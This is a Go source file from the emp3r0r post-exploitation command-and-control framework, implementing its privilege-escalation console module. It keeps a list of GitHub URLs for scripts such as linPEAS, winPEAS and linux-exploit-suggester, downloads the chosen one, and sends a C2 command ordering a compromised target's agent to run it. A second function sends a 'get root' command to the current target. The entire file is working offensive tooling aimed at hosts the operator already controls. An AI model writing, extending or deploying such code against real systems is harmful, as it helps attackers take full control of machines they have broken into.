//go:build linux
// +build linux

package cc

import (
	"fmt"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

// LPEHelperURLs scripts that help you get root
var LPEHelperURLs = map[string]string{
	"lpe_les":         "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
	"lpe_lse":         "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
	"lpe_linpeas":     "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
	"lpe_winpeas.ps1": "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1",
	"lpe_winpeas.bat": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat",
	"lpe_winpeas.exe": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe",
}

func moduleLPE() {
	go func() {
		// target
		target := CurrentTarget
		if target == nil {
			CliPrintError("Target not exist")
			return
		}
		helperName := Options["lpe_helper"].Val

		// download third-party LPE helper
		CliPrintInfo("Updating local LPE helper...")
		err := DownloadFile(LPEHelperURLs[helperName], Temp+tun.WWW+helperName)
		if err != nil {
			CliPrintError("Failed to download %s: %v", helperName, err)
			return
		}

		// exec
		CliMsg("This can take some time, please be patient")
		cmd := fmt.Sprintf("%s --script_name %s", emp3r0r_data.C2CmdLPE, helperName)
		CliPrintInfo("Running %s", cmd)
		err = SendCmd(cmd, "", target)
		if err != nil {
			CliPrintError("Run %s: %v", cmd, err)
		}
	}()
}

func moduleGetRoot() {
	err := SendCmdToCurrentTarget(emp3r0r_data.C2CmdGetRoot, "")
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	CliMsg("Please wait for agent's response...")
}
